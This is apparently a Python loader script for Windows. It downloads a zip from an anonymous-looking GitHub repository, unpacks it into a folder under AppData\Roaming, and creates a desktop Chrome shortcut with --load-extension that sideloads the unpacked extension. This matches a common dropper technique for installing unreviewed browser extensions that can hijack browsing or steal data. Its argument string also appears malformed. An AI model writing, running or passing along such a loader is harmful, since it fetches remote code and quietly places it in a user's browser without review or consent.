import os
import shutil
import requests
import pythoncom
import ctypes
import zipfile
import win32com.client 
from win32com.client import Dispatch
from win32com.shell import shell, shellcon

def download_file(url, save_path):
    response = requests.get(url)
    os.makedirs(os.path.dirname(save_path), exist_ok=True)  # Create directory if it doesn't exist
    with open(save_path, 'wb') as f:
        f.write(response.content)

def find_chrome_executable():
    # List of possible directories where Chrome might be installed
    program_files_dirs = [os.path.join(os.environ['ProgramFiles'], 'Google\\Chrome\\Application'),
                          os.path.join(os.environ['ProgramFiles(x86)'], 'Google\\Chrome\\Application')]

    # Check each directory for the existence of chrome.exe
    for directory in program_files_dirs:
        chrome_executable = os.path.join(directory, 'chrome.exe')
        if os.path.exists(chrome_executable):
            return chrome_executable  # Return the first found executable
    return None  # Return None if Chrome executable is not found in any directory

def create_shortcut(target_path, shortcut_name, arguments=""):
    # Get the desktop directory
    desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')

    # Create the shortcut file
    shortcut_path = os.path.join(desktop_path, shortcut_name + '.lnk')

    # Create a shell object
    shell = Dispatch('WScript.Shell')

    # Create a shortcut object
    shortcut = shell.CreateShortCut(shortcut_path)

    # Set the target path
    shortcut.TargetPath = target_path

    # Set the arguments (if any)
    shortcut.Arguments = arguments

    # Save the shortcut
    shortcut.Save()

if __name__ == "__main__":
    appdata_dir = os.path.expanduser('~\\AppData\\Roaming\\MyFolder')
    save_path = os.path.join(appdata_dir, 'extension.zip')
    url = 'https://github.com/aaaabbbbeeeeddddss/testing.github.io/raw/main/1.0_0.zip'
    download_file(url, save_path)

    # Extracted folder path
    extracted_folder_path = os.path.join(appdata_dir, 'extracted_folder')  # Assuming the zip file contains a single folder
    arguments = f'--load-extension="{extracted_folder_path}"\\1.0_0'
    os.makedirs(extracted_folder_path, exist_ok=True)

    # Open the zip file and extract its contents
    with zipfile.ZipFile(save_path, 'r') as zip_ref:
        zip_ref.extractall(extracted_folder_path)

    # Specify the path to your executable with the --load-extension flag
    #removed --load-extension="{extracted_folder_path}"
    target_path = find_chrome_executable()
    print(find_chrome_executable())

    # Specify the name of the shortcut
    shortcut_name = 'chrome extension'

    # Create the shortcut
    create_shortcut(target_path, shortcut_name, arguments)
